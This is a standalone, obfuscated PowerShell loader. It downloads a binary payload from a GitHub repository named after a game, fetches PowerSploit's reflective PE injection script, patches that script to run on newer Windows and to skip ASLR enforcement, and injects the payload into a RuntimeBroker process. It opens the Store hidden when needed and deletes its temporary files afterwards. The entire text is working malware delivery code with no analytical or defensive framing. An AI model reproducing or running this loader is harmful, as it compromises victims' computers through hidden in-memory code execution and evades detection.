$ErrorActionPreference = @("St","op") -join ""
$_0x91A = @("https://raw",".githubusercontent",".com/mk121X","/valorant/refs","/heads/main/","payload") -join ""
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
$_0x3D2 = @("https://raw",".githubusercontent",".com/PowerShellMafia","/PowerSploit/master","/CodeExecution/","Invoke-ReflectivePEInjection.ps1") -join ""
$_0x8E4 = "$env:TEMP\R_$(Get-Random).ps1"
Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
$_0xA77 = Get-Content $_0x8E4 -Raw
$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
$_0xA77 = $_0xA77 -replace 'if\s*\(\s*\$ForceASLR\s*-eq\s*\$true\s*\)', 'if ($false)'
$_0xC11 = "$env:TEMP\R_fixed.ps1"
$_0xA77 | Set-Content $_0xC11 -Encoding UTF8
. $_0xC11
$_0xBBB = Get-Process -Name (@("Runtime","Broker") -join "") -ErrorAction SilentlyContinue | Select-Object -First 1
if ($null -eq $_0xBBB) {
    Start-Process (@("ms-windows","-store:") -join "") -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    $_0xBBB = Get-Process -Name (@("Runtime","Broker") -join "") -ErrorAction SilentlyContinue | Select-Object -First 1
}
if ($null -eq $_0xBBB) { exit 1 }
Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0xBBB.Id
Remove-Item $_0x8E4 -Force -ErrorAction SilentlyContinue
Remove-Item $_0xC11 -Force -ErrorAction SilentlyContinue
